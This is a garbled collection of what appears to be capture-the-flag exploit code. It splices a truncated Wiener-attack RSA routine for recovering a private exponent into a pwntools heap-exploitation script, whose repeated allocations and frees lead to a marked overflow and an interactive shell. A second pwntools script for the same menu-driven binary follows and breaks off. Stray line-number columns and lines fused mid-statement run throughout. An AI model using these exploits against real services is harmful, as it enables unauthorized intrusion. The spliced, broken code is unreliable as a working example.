choice1的交互次数
    offset = times3(offset)
    offset = times3(offset)
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
    checksum = bytearray(blocksize)
    # check if full block
    H_m = header[((m - 1) * blocksize):]
    assert len(H_m)  = ZZ['x']
    for index, k in enumerate(cf[1:]):
        d0 = k.denominator()
        k = k.numerator()
        if k != 0 and (e * d0 - 1) % k == 0:
            phi = (e*d0 - 1) //k
            s = (N-phi+1)
            f = x^2 - s*x + N
            b = f.discriminant()
            if b > 0 and b.is_square():
                d = d0
                roots = list(zip(*f.roots()))[0]
                if len(roots) == 2 and prod(roots) == N:
                    print("[x] Recovered! \nd = %0x" %d)
                    return d
            else:
                continue
    print("[] Could not determine the value of d with the parameters given. 
Make sure that d >')
  p.sendline('1')
  p.recvuntil('index')
  p.sendline(str(idx))
  p.recvuntil('name')
  p.send(name)
  p.recvuntil('size')
  p.sendline(str(size))
  p.recvuntil('data')
  p.send(data)
def dele(idx):
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
  p.recvuntil('>>')
  p.sendline('5')
  p.recvuntil('index')
  p.sendline(str(idx))
a = getf(1,0xfffffffe,0x1,0x10)
la = len(a)
#print la
load(0,'aaa\n',la,a)
a = getf(1,0,0x170,0)
la = len(a)
print la
load(1,'bbb\n',la,a)
a = getf(1,0,0x170,0)
la = len(a)
print la
load(2,'ccc\n',la,a)
a = getf(1,0,0x170,0)
la = len(a)
print la
load(3,'bbb\n',la,a)
dele(1)
dele(2)
dele(3)
a = getf(1,0,0x50,0)
la = len(a)
print la
load(1,'bbb\n',la,a)
a = getf(1,0,0x50,0)
la = len(a)
print la
load(2,'ccc\n',la,a)
a = getf(1,0,0x50,0)
la = len(a)
print la
load(3,'bbb\n',la,a)
dele(1)
dele(2)
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
dele(3)
a = getf(1,0,0x50,0)
la = len(a)
print la
load(1,'ccc\n',la,a)
a = getf(2,0,0x50,0)+addenc(0,0xa0,0)
la = len(a)
print la
load(2,'xxx\n',la,a)#overflow
p.interactive()
70
71
72
73
74
75
76
77
78
79
80
81
82
#coding=utf-8
from pwn import *
from docker_debug import *
#context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'
context.aslr = False
debug_env = DockerDebug('ubuntu-1604')
process = debug_env.process
attach = debug_env.attach
def my_load(p, idx, name, size, data):
    p.recvuntil('>> ')
    p.sendline('1')
    p.recvuntil('index: ')
    p.sendline(str(idx))
    p.recvuntil('name: ')
    p.send(name)
    p.recvuntil('size: ')
    p.sendline(str(size))
    p.recvuntil('data: ')
    p.send(data)
def delete(p, idx):
    p.recvuntil('>> ')
    p.sendline('5')
    p.recvuntil('index: ')
    p.sendline(str(idx))
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
def run(p, idx):
    p.recvuntil('>> ')
    p.sendline('4')
    p.recvuntil('index: ')